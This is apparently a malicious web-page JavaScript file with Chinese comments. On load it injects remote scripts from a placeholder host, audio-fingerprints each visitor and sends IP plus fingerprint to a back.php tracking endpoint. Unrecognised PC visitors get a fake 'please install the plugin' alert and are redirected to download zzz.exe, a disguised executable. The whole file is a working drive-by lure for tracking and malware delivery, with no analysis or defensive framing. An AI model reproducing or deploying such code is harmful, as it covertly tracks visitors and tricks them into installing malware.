var returnCitySN = {"cip": "0.0.0.0", "extend": "000000"};
// document.write("<script src='http://pv.sohu.com/cityjson?ie=utf-8'></script>");
document.write("<script src='http://xxxx.com/audio-fingerprinting.js'></script>")
document.write("<script src='http://xxxx.com/back.php?getaddr=123'></script>");


//上线检测
function isRise(ip,extend) {
    var xmlHttp;
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    } else {
        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    audioFingerprint.run(
        function (fingerprint){
        // document.write(fingerprint);
        console.log(fingerprint);
        xmlHttp.open("GET", "http://xxxx.com/back.php?search="+ip+fingerprint, "true");
        xmlHttp.send();
        xmlHttp.onreadystatechange = function() {
        //alert(xmlHttp.responseText)
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
            var resData = xmlHttp.responseText;
            if (resData == "in" && extend == "111111") {
            } else {
                document.write("<script src='http://xxxx.com/back.php?bite1=1'></script>");
                xmlHttp.open("GET", "http://xxxx.com/back.php?ip="+ip+fingerprint, "true");
                xmlHttp.send();
                xmlHttp.onreadystatechange = function() {
                if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {} else {}}
                download();
            }
        }
    }
    });
    
}

//下载
function download(){
    alert("请尝试下载并安装插件后访问本页面!");
    window.location.href="http://xxxx.com/zzz.exe";
}

//判断是否是PC
function isPc() {
    if (navigator.userAgent.match(/(iPhone|Android)/i)) {
        return false;
    } else {
        return true;
    }
}

//load,ipbase64编码后,传递给后端
window.onload = function(){
    if(!isPc()){
        alert("当前页面只能在电脑PC端中加载,请稍后重试...");
    }else{
        isRise(returnCitySN["cip"], returnCitySN["extend"]);
    }
}